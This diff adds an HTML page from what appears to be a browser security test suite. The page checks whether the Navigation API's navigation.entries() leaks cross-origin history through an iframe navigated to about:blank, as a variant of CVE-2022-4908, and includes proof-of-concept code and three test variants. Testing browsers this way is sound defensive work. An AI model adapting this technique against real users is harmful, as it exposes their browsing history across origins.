@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>UXSS-CHROME-01: Navigation API history.entries() Cross-Origin Leak</title>
+    <link rel="stylesheet" href="../../../css/style.css">
+</head>
+<body class="test-page" style="background:#0d1117;color:#c9d1d9;">
+<div class="container">
+    <a href="../../../index.html" class="btn btn-back">&larr; Back to Suite</a>
+    <h1>Navigation API navigation.entries() Cross-Origin Leak</h1>
+    <div class="meta">
+        <span>ID: UXSS-CHROME-01</span>
+        <span>CVE: CVE-2022-4908 (variant test)</span>
+        <span>Browsers: Chrome, Opera, Edge</span>
+        <span>Category: UXSS / SOP Bypass</span>
+    </div>
+
+    <div class="test-section">
+        <h2>Description</h2>
+        <p>Tests whether the Navigation API's <code>navigation.entries()</code> leaks cross-origin
+        URL history from iframes navigated to about:blank. In CVE-2022-4908, calling
+        <code>navigation.entries()</code> in a hijacked iframe returned the history array
+        connected to the origin that was present before navigating to about:blank.</p>
+        <p>This test checks if modern browsers still expose any cross-origin navigation entries
+        after iframe navigation, including variants with fragment navigations and pushState.</p>
+    </div>
+
+    <div class="test-section">
+        <h2>Technique</h2>
+        <div class="code-block">// 1. Create iframe pointing to cross-origin (ebniw.com)
+// 2. Wait for load, then navigate iframe to about:blank
+// 3. Access iframe.contentWindow.navigation.entries()
+// 4. Check if entries contain cross-origin URLs
+
+const frame = document.createElement('iframe');
+frame.src = 'https://ebniw.com/';
+document.body.appendChild(frame);
+
+frame.onload = () => {
+    // Navigate to about:blank (same-origin with parent)
+    frame.contentWindow.location = 'about:blank';
+    setTimeout(() => {
+        try {
+            const nav = frame.contentWindow.navigation;
+            if (nav) {
+                const entries = nav.entries();
+                // Check for leaked cross-origin URLs
+                entries.forEach(e => {
+                    if (e.url && e.url.includes('ebniw.com')) {
+                        // VULNERABLE: cross-origin URL leaked
+                    }
+                });
+            }
+        } catch(e) { /* blocked by SOP */ }
+    }, 1000);
+};</div>
+    </div>
+
+    <div class="test-section">
+        <h2>Run Test</h2>
+        <button class="btn btn-run" onclick="runTest()">Execute Test</button>
+        <button class="btn" onclick="runVariant2()">Variant: pushState after navigation</button>
+        <button class="btn" onclick="runVariant3()">Variant: Fragment navigation</button>
+        <div id="output" class="output-box" style="margin-top:10px;"></div>
+    </div>
+</div>
+
+<script src="../../../js/utils.js"></script>
+<script>
+function runTest() {
+    const output = document.getElementById('output');
+    output.innerHTML = '<div style="color:#d29922;">Running test...</div>';
+    const info = detectBrowser();
+    output.innerHTML += '<div style="color:#8b949e;">Browser: ' + info.browser + ' ' + info.version + ' (' + info.engine + ')</div>';
+
+    if (!window.navigation) {
+        output.innerHTML += '<div style="color:#8b949e;">Navigation API not supported in this browser. Test N/A.</div>';
+        return;
+    }
+
+    const frame = document.createElement('iframe');
+    frame.style.display = 'none';
+    frame.src = CONFIG.XORIGIN_ORIGIN + '/';
+    document.body.appendChild(frame);
+
+    frame.onload = function() {
+        // Navigate to about:blank
+        try { frame.contentWindow.location = 'about:blank'; } catch(e) {
+            output.innerHTML += '<div style="color:#8b949e;">Cannot navigate cross-origin frame (expected in some browsers).</div>';
+        }
+
+        setTimeout(function() {
+            try {
+                const nav = frame.contentWindow.navigation;
+                if (nav && typeof nav.entries === 'function') {
+                    const entries = nav.entries();
+                    let leaked = false;
+                    entries.forEach(function(entry) {
+                        if (entry.url && !entry.url.startsWith('about:')) {
+                            output.innerHTML += '<div style="color:#f85149;"><strong>LEAKED ENTRY:</strong> ' + entry.url + '</div>';
+                            leaked = true;
+                        }
+                    });
+                    reportResult('output', 'Navigation API entries() leak', leaked,
+                        leaked ? 'Cross-origin URLs found in navigation.entries()' : 'No cross-origin URLs leaked. entries count: ' + entries.length);
+                } else {
+                    output.innerHTML += '<div style="color:#8b949e;">navigation.entries() not accessible on child frame.</div>';
+                    reportResult('output', 'Navigation API entries() leak', false, 'API not accessible');
+                }
+            } catch(e) {
+                reportResult('output', 'Navigation API entries() leak', false, 'Blocked: ' + e.message);
+            }
+            document.body.removeChild(frame);
+        }, 2000);
+    };
+
+    frame.onerror = function() {
+        output.innerHTML += '<div style="color:#8b949e;">Frame failed to load target.</div>';
+    };
+}
+
+function runVariant2() {
+    const output = document.getElementById('output');
+    output.innerHTML = '<div style="color:#d29922;">Running pushState variant...</div>';
+
+    if (!window.navigation) {
+        output.innerHTML += '<div style="color:#8b949e;">Navigation API not supported.</div>';
+        return;
+    }
+
+    const frame = document.createElement('iframe');
+    frame.style.display = 'none';
+    frame.srcdoc = '<html><body>initial</body></html>';
+    document.body.appendChild(frame);
+
+    frame.onload = function() {
+        try {
+            // pushState in the iframe context
+            frame.contentWindow.history.pushState({}, '', '/fake-path');
+            frame.contentWindow.history.pushState({}, '', '/another-path');
+
+            // Now navigate away and back
+            frame.contentWindow.location = CONFIG.XORIGIN_ORIGIN + '/';
+
+            setTimeout(function() {
+                try {
+                    frame.contentWindow.location = 'about:blank';
+                    setTimeout(function() {
+                        try {
+                            const entries = frame.contentWindow.navigation ? frame.contentWindow.navigation.entries() : [];
+                            let leaked = false;
+                            entries.forEach(function(e) {
+                                if (e.url && e.url.includes(CONFIG.XORIGIN_DOMAIN)) {
+                                    leaked = true;
+                                    output.innerHTML += '<div style="color:#f85149;">LEAKED: ' + e.url + '</div>';
+                                }
+                            });
+                            reportResult('output', 'pushState variant', leaked,
+                                leaked ? 'Cross-origin history entries leaked after pushState' : 'No leak detected');
+                        } catch(e) {
+                            reportResult('output', 'pushState variant', false, 'Blocked: ' + e.message);
+                        }
+                    }, 1500);
+                } catch(e) {
+                    reportResult('output', 'pushState variant', false, 'Blocked: ' + e.message);
+                }
+            }, 2000);
+        } catch(e) {
+            reportResult('output', 'pushState variant', false, 'Error: ' + e.message);
+        }
+    };
+}
+
+function runVariant3() {
+    const output = document.getElementById('output');
+    output.innerHTML = '<div style="color:#d29922;">Running fragment navigation variant...</div>';
+
+    const frame = document.createElement('iframe');
+    frame.style.display = 'none';
+    frame.src = CONFIG.XORIGIN_ORIGIN + '/#test';
+    document.body.appendChild(frame);
+
+    setTimeout(function() {
+        try {
+            // Try fragment navigation on cross-origin frame
+            frame.src = CONFIG.XORIGIN_ORIGIN + '/#leaked-fragment';
+            setTimeout(function() {
+                try {
+                    // Navigate to about:blank
+                    frame.contentWindow.location = 'about:blank';
+                    setTimeout(function() {
+                        try {
+                            const loc = frame.contentWindow.location.href;
+                            output.innerHTML += '<div style="color:#8b949e;">Frame location after blank nav: ' + loc + '</div>';
+
+                            if (frame.contentWindow.navigation) {
+                                const entries = frame.contentWindow.navigation.entries();
+                                let leaked = false;
+                                entries.forEach(function(e) {
+                                    output.innerHTML += '<div>Entry: ' + (e.url || 'N/A') + '</div>';
+                                    if (e.url && e.url.includes(CONFIG.XORIGIN_DOMAIN)) leaked = true;
+                                });
+                                reportResult('output', 'Fragment navigation variant', leaked);
+                            } else {
+                                reportResult('output', 'Fragment navigation variant', false, 'Navigation API not available');
+                            }
+                        } catch(e) {
+                            reportResult('output', 'Fragment navigation variant', false, 'Blocked: ' + e.message);
+                        }
+                    }, 1000);
+                } catch(e) {
+                    reportResult('output', 'Fragment navigation variant', false, 'Blocked: ' + e.message);
+                }
+            }, 1500);
+        } catch(e) {
+            reportResult('output', 'Fragment navigation variant', false, 'Error: ' + e.message);
+        }
+    }, 2000);
+}
+</script>
+</body>
+</html>
